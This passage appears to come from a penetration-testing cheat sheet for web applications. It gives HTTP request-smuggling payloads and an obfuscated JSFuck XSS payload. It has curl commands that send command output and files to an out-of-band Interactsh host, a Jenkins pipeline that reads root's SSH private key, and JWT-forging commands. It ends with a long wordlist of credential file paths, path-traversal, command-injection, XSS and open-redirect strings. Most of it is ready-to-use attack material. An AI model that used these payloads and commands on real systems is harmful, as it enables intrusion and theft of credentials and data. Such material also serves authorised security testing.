#### Request Body

```c
{"firstname": "bob", "lastname": "bobber", "email": "bob@bob.com"}
```

#### Response

```c
HTTP/1.1 201 Created
```
 
### HTTP DELETE

- Delete an item

```c
DELETE /v1/users/123
```

#### Response

```c
HTTP/1.1 200 OK
HTTP/1.1 204 NO CONTENT
```
 
### HTTP PATCH

- Partially modify an item

```c
PATCH /v1/users/123
```

#### Request Body

```c
{ 
   "email": "bob@company.com"
}
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP HEAD

- Identical to GET but no message body in the response

```c
HEAD /v1/products/iphone
```

```c
$ curl -v -X HEAD -k https://example.com 80
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP CONNECT

- Create a two-way connection with a proxy server

```c
CONNECT <RHOST>:80
```

#### Request

```c
Host: <RHOST>
Proxy-Authorization: basic UEBzc3dvcmQxMjM=
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP OPTIONS

- Return a list of supported HTTP methods

```c
OPTIONS /v1/users
```

```c
$ curl -v -X OPTIONS -k https://example.com 80
```

#### Response

```c
HTTP/1.1 200 OK
Allow: GET,POST,DELETE,HEAD,OPTIONS
```
 
### HTTP TRACE

- Perform a message loop-back test, providing a debugging mechanism

```c
TRACE /index.html
```

```c
$ curl -v -X TRACE -k https://example.com 80
```

#### Response

```c
Host: <RHOST>
Via: <RHOST>
X-Forwardet-For: <RHOST>
```

## HTTP Request Smuggling / HTTP Desync Attack

### Quick Wins

```c
Content-Length: 0
Connection: Content-Lentgh
```

### Content-Length / Transfer-Encoding (CL.TE)

#### Searching for Vulnerability

```c
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

#### Skeleton Payload

```c
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked
\ `0`\
GET /404 HTTP/1.1
Foo: Bar
```

### Transfer-Encoding / Content-Length (TE.CL)

#### Searching for Vulnerability

```c
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

#### Skeleton Payload

```c
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked
\ `7b`\ `GET /404 HTTP/1.1`\ `Host: <RHOST>`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\
x=
0
\
```

### Transfer-Encoding / Transfer-Encoding (TE.TE)

```c
Transfer-Encoding: xchunked
\ `Transfer-Encoding : chunked`\
Transfer-Encoding: chunked
Transfer-Encoding: x
\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\
Transfer-Encoding:[tab]chunked
\ `[space]Transfer-Encoding: chunked`\
X: X[\n]Transfer-Encoding: chunked
``
Transfer-Encoding
: chunked
```

## httprobe

> https://github.com/tomnomnom/httprobe

```c
$ go install github.com/tomnomnom/httprobe@latest
```

## httpx

> https://github.com/projectdiscovery/httpx

```c
$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

## Interactsh

> https://app.interactsh.com

### Output Redirect into File

```c
$ curl -X POST -d  `ls -la / > output.txt` cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@output.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
```

## JavaScript

### JSFuck

> http://www.jsfuck.com/

> https://github.com/aemkei/jsfuck

> https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

```c
![]                                          // false
!![]                                         // true
[][[]]                                       // undefined
+[![]]                                       // NaN
+[]                                          // 0
+!+[]                                        // 1
!+[]+!+[]                                    // 2
[]                                           // Array
+[]                                          // Number
[]+[]                                        // String
![]                                          // Boolean
[]["filter"]                                 // Function
[]["filter"]["constructor"]( <CODE> )()      // eval
[]["filter"]["constructor"]("<FOOBAR>")()    // window
```

#### Encoded Payload

```c
<img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
```

## Jenkins

### Read SSH Keys through Pipelines

The following example the `SSH Agent Plugin` enabled.

```c
pipeline {
    agent any
    
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@<RHOST> "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

## jsleak

```c
$ echo http://<DOMAIN>/ | jsleak -s          // Secret Finder
$ echo http://<DOMAIN>/ | jsleak -l          // Link Finder
$ echo http://<DOMAIN>/ | jsleak -e          // Complete URL
$ echo http://<DOMAIN>/ | jsleak -c 20 -k    // Check Status
$ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
```

## JWT_Tool

> https://github.com/ticarpi/jwt_tool

```c
$ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
$ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
```

## Kyubi

> https://github.com/shibli2700/Kyubi

```c
$ kyubi -v <URL>
```

## Leaky Paths

```c
.aws/config
.aws/credentials
.aws/credentials.gpg
.boto
.config/filezilla/filezilla.xml
.config/filezilla/recentservers.xml
.config/gcloud/access_tokens.db
.config/gcloud/credentials.db
.config/hexchat
.config/monero-project/monero-core.conf
.davfs2
.docker/ca.pem
.docker/config.json
.git-credentials
.gitconfig
.netrc
.passwd-s3fs
.purple/accounts.xml
.s3cfg
.s3ql/authinfo2
.shodan/api_key
.ssh/authorized_keys
.ssh/authorized_keys2
.ssh/config
.ssh/id_rsa
.ssh/id_rsa.pub
.ssh/known_hosts
/+CSCOE+/logon.html
/+CSCOT+/oem
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/+CSCOT+/translation
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5c..%5cetc/passwd
/..%5c..%5c..%5cetc/passwd
/..%5c..%5cetc/passwd
/..%5cetc/passwd
/..;/examples/jsp/index.html
/..;/examples/servlets/index.html
/..;/examples/websocket/index.xhtml
/..;/manager/html
/./../../../../../../../../../../etc/passwd
/.appveyor.yml
/.axiom/accounts/do.json
/.azure-pipelines.yml
/.build.sh
/.bzr/branch/branch.conf
/.chef/config.rb
/.circleci/config.yml
/.circleci/ssh-config
/.composer-auth.json
/.composer/composer.json
/.config/gcloud/access_tokens.db
/.config/gcloud/configurations/config_default
/.config/gcloud/credentials.db
/.config/karma.conf.js
/.dbeaver/credentials-config.json
/.docker/config.json
/.dockercfg
/.dockerfile
/.Dockerfile
/.drone.yml
/.DS_Store
/.editorconfig
/.env
/.env.backup
/.env.dev
/.env.dev.local
/.env.development.local
/.env.example
/.env.live
/.env.local
/.env.old
/.env.prod
/.env.prod.local
/.env.production
/.env.production.local
/.env.save
/.env.stage
/.env.www
/.env_1
/.env_sample
/.esmtprc
/.ftpconfig
/.git
/.git-credentials
/.git/config
/.git/head
/.git/logs/HEAD
/.git/refs/heads
/.github/workflows/automerge.yml
/.github/workflows/build.yaml
/.github/workflows/build.yml
/.github/workflows/ci-daily.yml
/.github/workflows/ci-generated.yml
/.github/workflows/ci-issues.yml
/.github/workflows/ci-push.yml
/.github/workflows/ci.yaml
/.github/workflows/ci.yml
/.github/workflows/CI.yml
/.github/workflows/coverage.yml
/.github/workflows/dependabot.yml
/.github/workflows/deploy.yml
/.github/workflows/docker.yml
/.github/workflows/lint.yml
/.github/workflows/main.yaml
/.github/workflows/main.yml
/.github/workflows/pr.yml
/.github/workflows/publish.yml
/.github/workflows/push.yml
/.github/workflows/release.yaml
/.github/workflows/release.yml
/.github/workflows/smoosh-status.yml
/.github/workflows/snyk.yml
/.github/workflows/test.yaml
/.github/workflows/test.yml
/.github/workflows/tests.yaml
/.github/workflows/tests.yml
/.gitignore
/.hg/hgrc
/.htaccess
/.htpasswd
/.idea/dataSources.xml
/.idea/deployment.xml
/.idea/httpRequests/http-client.cookies
/.idea/httpRequests/http-requests-log.http
/.idea/workspace.xml
/.jenkins.sh
/.mailmap
/.msmtprc
/.netrc
/.npm/anonymous-cli-metrics.json
/.phpunit.result.cache
/.redmine
/.redmine-cli
/.settings/rules.json?auth=FIREBASE_SECRET
/.snyk
/.ssh/authorized_keys
/.ssh/id_dsa
/.ssh/id_rsa
/.ssh/known_hosts
/.ssh/known_hosts.old
/.styleci.yml
/.svn
/.svn/entries
/.svn/prop
/.svn/text
/.travis.sh
/.tugboat
/.user.ini
/.vscode/
/.well
/.well-known/matrix/client
/.well-known/matrix/server
/.well-known/openid-configuration
/.wget-hsts
/.wgetrc
/.wp-config.php.swp
/////evil.com
///evil.com/%2F..
//admin/
//anything/admin/
//evil.com/%2F..
//evil.com/..;/css
//secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
/1.sql
/404.php.bak
/?view=log
/?wsdl
/_/.ssh/authorized_keys
/___graphql
/__clockwork/app
/__swagger__/
/_cat/health
/_cat/indices
/_cluster/health
/_config.yml
/_darcs/prefs/binaries
/_debug_toolbar/
/_debugbar/open?max=20&offset=0
/_netrc
/_notes/dwsync.xml
/_profiler/empty/search/results?limit=10
/_profiler/phpinfo
/_profiler/phpinfo.php
/_something_.cfm
/_swagger_/
/_vti_bin/Authentication.asmx?op=Mode
/_vti_bin/lists.asmx?WSDL
/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
/abs/
/access.log
/access/config
/access_tokens.db
/actions/seomatic/meta
/actuator
/actuator/auditevents
/actuator/auditLog
/actuator/beans
/actuator/caches
/actuator/conditions
/actuator/configprops
/actuator/configurationMetadata
/actuator/dump
/actuator/env
/actuator/events
/actuator/exportRegisteredServices
/actuator/favicon.ico
/actuator/features
/actuator/flyway
/actuator/healthcheck
/actuator/heapdump
/actuator/httptrace
/actuator/hystrix.stream
/actuator/integrationgraph
/actuator/jolokia
/actuator/liquibase
/actuator/logfile
/actuator/loggers
/actuator/loggingConfig
/actuator/management
/actuator/mappings
/actuator/metrics
/actuator/refresh
/actuator/registeredServices
/actuator/releaseAttributes
/actuator/resolveAttributes
/actuator/scheduledtasks
/actuator/sessions
/actuator/shutdown
/actuator/springWebflow
/actuator/sso
/actuator/ssoSessions
/actuator/statistics
/actuator/status
/actuator/threaddump
/actuator/trace
/actuators/
/actuators/dump
/actuators/env
/actuators/health
/actuators/logfile
/actuators/mappings
/actuators/shutdown
/actuators/trace
/adfs/ls/idpinitiatedsignon.aspx
/adfs/services/trust/2005/windowstransport
/adjuncts/3a890183/
/admin
/admin../admin
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
/admin/
/Admin/
/admin/../admin
/admin//phpmyadmin/
/admin/adminer.php
/admin/configs/application.ini
/admin/data/autosuggest
/admin/error.log
/admin/errors.log
/admin/heapdump
/admin/index.php
/admin/init
/admin/log/error.log
/admin/login
/admin/login.html
/admin/login/?next=/admin/
/admin/logs/error.log
/admin/logs/errors.log
/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
/Admin/ServerSide/Telerik.Web.UI.DialogHandler.aspx?dp=1
/admin/views/ajax/autocomplete/user/a
/admin;/
/Admin;/
/adminadminer.php
/adminer.php
/adminer/
/adminer/adminer.php
/adminer/index.php
/ADSearch.cc?methodToCall=search
/aims/ps/
/airflow.cfg
/AirWatch/Login
/alps/profile
/altair
/analytics/saw.dll?bieehome&startPage=1#grabautologincookies
/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
/anchor/errors.log
/android/app/google-services.json
/anonymous-cli-metrics.json
/ansible.cfg
/anything_here
/apache
/apache.conf
/apc.php
/apc/apc.php
/api
/api-docs
/api-docs/swagger.json
/api-docs/swagger.yaml
/api/
/api/.env
/api/__swagger__/
/api/_swagger_/
/api/api
/api/api-browser/
/api/api-docs
/api/api-docs/swagger.json
/api/api-docs/swagger.yaml
/api/apidocs
/api/apidocs/swagger.json
/api/apidocs/swagger.yaml
/api/application.wadl
/api/batch
/api/cask/graphql
/api/cask/graphql-playground
/api/config
/api/docs
/api/docs/
/api/graphql
/api/graphql/v1
/api/index.html
/api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/api/jsonws
/api/jsonws/invoke
/api/profile
/api/proxy
/api/snapshots
/api/spec/swagger.json
/api/spec/swagger.yaml
/api/swagger
/api/swagger-resources
/api/swagger-resources/restservices/v2/api-docs
/api/swagger-ui.html
/api/swagger-ui/api-docs
/api/swagger-ui/swagger.json
/api/swagger-ui/swagger.yaml
/api/swagger.json
/api/swagger.yaml
/api/swagger.yml
/api/swagger/index.html
/api/swagger/static/index.html
/api/swagger/swagger
/api/swagger/swagger-ui.html
/api/swagger/ui/index
/api/swagger_doc.json
/api/timelion/run
/api/v1
/api/v1/
/api/v1/application.wadl
/api/v1/canal/config/1/1
/api/v1/namespaces
/api/v1/namespaces/default/pods
/api/v1/namespaces/default/secrets
/api/v1/namespaces/default/services
/api/v1/nodes
/api/v1/swagger-ui/swagger.json
/api/v1/swagger-ui/swagger.yaml
/api/v1/swagger.json
/api/v1/swagger.yaml
/api/v2
/api/v2/application.wadl
/api/v2/swagger.json
/api/v2/swagger.yaml
/api/vendor/phpunit/phpunit/phpunit
/api/whoami
/api_docs
/api_smartapp/storage/
/apis
/apis/apps/v1/namespaces/default/deployments
/aplicacao/application/configs/application.ini
/app/config/parameters.yml
/app/config/parameters.yml.dist
/app/config/pimcore/google-api-private-key.json
/app/config/security.yml
/app/etc/local.xml
/app/google-services.json
/app/kibana/
/app/settings.py
/App_Master/Telerik.Web.UI.DialogHandler.aspx?dp=1
/application.ini
/application.wadl
/application.wadl?detail=true
/application/configs/application.ini
/application/logs/access.log
/application/logs/application.log
/application/logs/default.log
/apps/vendor/phpunit/phpunit/phpunit
/appsettings.json
/appspec.yaml
/appspec.yml
/appveyor.yml
/asdf.php
/AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx?dp=1
/assets../.git/config
/assets/.gitignore
/assets/config.rb
/assets/credentials.json
/assets/file
/assets/other/service-account-credentials.json
/asynchPeople/
/auditevents
/aura
/auth.html
/auth/login
/auth/realms/master/.well-known/openid-configuration
/authorization.do
/autoconfig
/autodiscover/
/autoupdate/
/aws.sh
/awstats.conf
/awstats.pl
/awstats/
/axis/
/axis/happyaxis.jsp
/axis2-web/HappyAxis.jsp
/axis2/
/axis2/axis2-web/HappyAxis.jsp
/azure-pipelines.yml
/backend
/backup
/backup.sh
/backup.sql
/backup/vendor/phpunit/phpunit/phpunit
/base/static/c
/beans
/BitKeeper/etc/config
/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
/blog/phpmyadmin/
/bower.json
/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB
/bugs/verify.php?confirm_hash=&id=1
/build.sh
/bundles/kibana.style.css
/bundles/login.bundle.js
/cacti/
/certenroll/
/certprov/
/certsrv/
/cfcache.map
/CFIDE/administrator/images/background.jpg
/cfide/administrator/images/background.jpg
/CFIDE/administrator/images/componentutilslogin.jpg
/cfide/administrator/images/componentutilslogin.jpg
/CFIDE/administrator/images/mx_login.gif
/cfide/administrator/images/mx_login.gif
/cgi
/cgi-bin/nagios3/status.cgi
/cgi-bin/nagios4/status.cgi
/cgi-bin/printenv.pl
/cgi-bin/upload/web-ftp.cgi
/CGI/Java/Serviceability?adapter=device.statistics.configuration
/CgiStart?page=Single
/CHANGELOG.md
/ckeditor/samples/
/client_secrets.json
/cloud-config.yml
/cloudexp/application/configs/application.ini
/cloudfoundryapplication
/cluster/cluster
/cms/application/configs/application.ini
/cms/portlets/Telerik.Web.UI.DialogHandler.aspx?dp=1
/cobbler_api
/common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx?dp=1
/compile.sh
/composer.json
/composer.lock
/conf/
/config.js
/config.php.bak
/config.rb
/config.sh
/config/
/config/configuration.yml
/config/database.yml
/config/databases.yml
/config/environment.rb
/config/error_log
/config/initializers/secret_token.rb
/config/jwt/private.pem
/config/packages/security.yaml
/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E
/config/properties.ini
/config/secrets.yml
/config/security.yml
/config/settings.yml
/config/storage.yml
/config/user.xml
/configprops
/configuration.php-dist
/configuration.yml
/configurations/config_default
/configure/app/landing/welcome-srm-va.html
/confluence
/conn.php.bak
/console
/console/login/LoginForm.jsp
/contact.php?theme=tes%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
/content../.git/config
/context.json
/control/login
/control/stream?contentId=<svg/onload=alert(1)>
/controller/config
/controller/registry
/controller/registry-clients
/core-cloud-config.yml
/core/config/databases.yml
/counters
/cp/Shares?user=&protocol=webaccess&v=2.3
/credentials.db
/credentials.json
/crossdomain.xml
/crowd/console/login.action
/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
/crx/de/index.jsp
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
/css../.git/config
/CTCWebService/CTCWebServiceBean
/CTCWebService/CTCWebServiceBean?wsdl
/darkstat/
/dasbhoard/
/dashboard/
/dashboard/phpinfo.php
/dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx/Desktopmodules/Admin/dnnWerk.Users/DialogHandler.aspx?dp=1
/data.sql
/data/adminer.php
/data/autosuggest
/data?get=prodServerGen
/database.php.bak
/database.sql
/database/schema.rb
/db.php.bak
/db.sql
/db/robomongo.json
/db/schema.rb
/db_backup.sql
/db_config.php.bak
/dbaas_monitor/login
/dbdump.sql
/debug
/debug.cgi
/debug.seam
/debug/default/view
/debug/default/view.html
/debug/pprof/
/debug/vars
/default.php.bak
/demo
/deploy.sh
/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/desktop.ini
/DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx?dp=1
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx?dp=1
/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx?dp=1
/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx?dp=1
/DesktopModules/TNComments/Telerik.Web.UI.DialogHandler.aspx?dp=1
/dev2local.sh
/development.log
/dfshealth.html
/dialin/
/dispatcher/invalidate.cache
/django/settings.py
/doc/page/login.asp
/doc/script/common.js
/docker-cloud.yml
/docker-compose-dev.yml
/docker-compose.dev.yml
/docker-compose.override.yml
/docker-compose.prod.yml
/docker-compose.production.yml
/docker-compose.staging.yml
/docker-compose.yml
/Dockerrun.aws.json
/docs
/docs/swagger.json
/domcfg.nsf
/download
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/index.html
/druid/indexer/v1/taskStatus
/dump
/dump.sql
/dwr/index.html
/eam/vib?id=/etc/issue
/ecp/
/editor/ckeditor/samples/
/elfinder.html
/elmah.axd
/elocker_old/storage/
/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E
/emergency.php
/env
/env.dev.js
/env.development.js
/env.js
/env.prod.js
/env.production.js
/env.sh
/env.test.js
/environment.rb
/equipbid/storage/
/error
/error.log
/error.txt
/error/error.log
/error_log
/error_log.txt
/errors.log
/errors.txt
/errors/errors.log
/errors_log
/etc
/etc/
/events../.git/config
/evil%E3%80%82com
/evil.com/
/evil.com//
/ews/
/examples/jsp/index.html
/examples/jsp/snp/snoop.jsp
/examples/servlets/index.html
/examples/websocket/index.xhtml
/exchange/
/exchweb/
/explore
/explorer
/express
/express-graphql
/extdirect
/favicon.ico
/fckeditor/_samples/default.html
/fetch
/filemanager/upload.php
/filezilla.xml
/FileZilla.xml
/filter/jmol/iframe.php?_USE=%22};alert(1337);//
/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file
/final/
/flow/registries
/footer.php.bak
/forum/phpmyadmin/
/frontend/web/debug/default/view
/ftpsync.settings
/fw.login.php
/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
/gallery/zp
/Gemfile
/Gemfile.lock
/getcfg.php
/getFavicon?host=burpcollaborator.net
/global
/glpi/status.php
/glpi2/status.php
/google-api-private-key.json
/google-services.json
/gotoURL.asp?url=google.com&id=43569
/graph
/graph_cms
/graphiql
/graphiql.css
/graphiql.js
/graphiql.min.css
/graphiql.min.js
/graphiql.php
/graphiql/finland
/graphql
/graphql-console
/graphql-devtools
/graphql-explorer
/graphql-playground
/graphql-playground-html
/graphql.php
/graphql/console
/graphql/graphql
/graphql/graphql-playground
/graphql/schema.json
/graphql/schema.xml
/graphql/schema.yaml
/graphql/v1
/groovyconsole
/groupexpansion/
/Gruntfile.coffee
/Gruntfile.js
/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
/happyaxis.jsp
/header.php.bak
/health
/healthz
/heapdump
/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
/home.html
/homepage.nsf
/hopfully404
/host.key
/hosts
/hsqldb%0a
/httpd.conf
/hybridconfig/
/HyperGraphQL
/hystrix.stream
/i.php
/id_dsa
/id_rsa
/IdentityGuardSelfService/
/IdentityGuardSelfService/images/favicon.ico
/images../.git/config
/images/favicon.ico
/img../.git/config
/IMS
/includes/.gitignore
/index.htm
/index.html
/index.jsp
/index.php
/index.php.bak
/index.php/admin/
/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
/index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
/index.php?redirect=//evil.com
/index.php?redirect=/\/evil.com/
/INF/maven/com.atlassian.jira/atlassian
/info.php
/info/
/infophp.php
/infos.php
/init.sh
/inormalydonotexist
/iNotes/Forms5.nsf
/iNotes/Forms6.nsf
/iNotes/Forms7.nsf
/iNotes/Forms8.nsf
/iNotes/Forms85.nsf
/iNotes/Forms9.nsf
/install
/install.php?profile=default
/install.sh
/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
/installer
/intikal/storage/
/invoker/EJBInvokerServlet/
/invoker/JMXInvokerServlet
/invoker/JMXInvokerServlet/
/ioncube/loader-wizard.php
/ipython/tree
/irj/portal
/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
/jasperserver/login.html?error=1
/je/graphql
/jeecg-boot/
/jenkins/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
/jenkins/script
/jira/secure/Dashboard.jspa
/jkstatus
/jkstatus/
/jkstatus;
/jmx
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
/jolokia
/jolokia/exec/ch.qos.logback.classic
/jolokia/list
/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
/jolokia/version
/josso/%5C../invoker/EJBInvokerServlet/
/josso/%5C../invoker/JMXInvokerServlet/
/js../.git/config
/js/elfinder.min.js
/js/elFinder.version.js
/jsapi_ticket.json
/jsonapi/user/user
/jsp/help
/jwt/private.pem
/karma.conf.js
/key.pem
/keycloak.json
/kustomization.yml
/laravel
/laravel-graphql-playground
/lfm.php
/lib../.git/config
/lib/phpunit/phpunit/phpunit
/libraries/joomla/database/
/libs/granite/core/content/login/favicon.ico
/LICENSE.txt
/linusadmin-phpinfo.php
/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
/loader-wizard.php
/loadtextfile.htm#programinfo
/local2dev.sh
/local2prod.sh
/localhost.key
/localhost.sql
/log.log
/log.txt
/log/access.log
/log/debug.log
/log/development.log
/log/error.log
/log/errors.log
/log/firewall.log
/log/mobile.log
/log/production.log
/log/system.log
/log/vpn.log
/log/warn.log
/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E
/logfile
/loggers
/login
/login.jsp
/login.php
/login.php.bak
/Login?!><sVg/OnLoAD=alert`1337`//
/login?next=%2F
/logon/LogonPoint/custom.html
/logon/LogonPoint/index.html
/logs.txt
/logs/access.log
/logs/awstats.pl
/logs/development.log
/logs/error.log
/logs/errors.log
/logs/production.log
/lol/graphql
/magmi/web/js/magmi_utils.js
/mailsms/s?func=ADMIN:appState&dumpConfig=/
/main.php.bak
/management
/manager/html
/mantis/verify.php?id=1&confirm_hash=
/mantisBT/verify.php?id=1&confirm_hash=
/mappings
/mcx/
/mcx/mcxservice.svc
/meaweb/os/mxperson
/media../.git/config
/meet/
/meeting/
/message?title=x&msg=%26%23<svg/onload=alert(1337)>
/metrics
/mgmt/tm/sys/management
/mgmt/tm/sys/management-ip
/microsoft
/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/mifs/c/d/android.html
/mifs/login.jsp
/mifs/user/login.jsp
/mobile/error
/Modules/CMS/Telerik.Web.UI.DialogHandler.aspx?dp=1
/modules/system/assets/js/framework.combined-min.js
/modules/vendor/phpunit/phpunit/phpunit
/moto/application/configs/application.ini
/mrtg/
/MRTG/
/my.key
/my.ppk
/MyErrors.log
/mysql.initial.sql
/mysql.sql
/mysqlbackup.sh
/mysqldump.sql
/nagios/cgi-bin/status.cgi
/names.nsf/People?OpenView
/nbproject/project.properties
/nextcloud/index.php/login
/nginx.conf
/nginx_status
/ngrok2/ngrok.yml
/nifi-api/access/config
/node/1?_format=hal_json
/npm-debug.log
/npm-shrinkwrap.json
/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
/OA_HTML/bin/sqlnet.log
/OA_HTML/jtfwrepo.xml
/oab/
/oauth-credentials.json
/oauth/token
/occ/v2/d2OzBcy
/ocsp/
/old/vendor/phpunit/phpunit/phpunit
/old_phpinfo.php
/oldsite/vendor/phpunit/phpunit/phpunit
/opcache
/opcache-status/
/opcache-status/opcache.php
/openapi.json
/Orion/Login.aspx
/os/mxperson
/ovirt-engine/
/owa/
/owa/auth/logon.aspx
/owncloud/config/
/package
/package-lock.json
/package.json
/pages
/pages/includes/status
/parameters.yml
/parameters.yml.dist
/Partners/application/configs/application.ini
/pdb/meta/v1/version
/PDC/ajaxreq.php?PARAM=127.0.0.1+
/perl
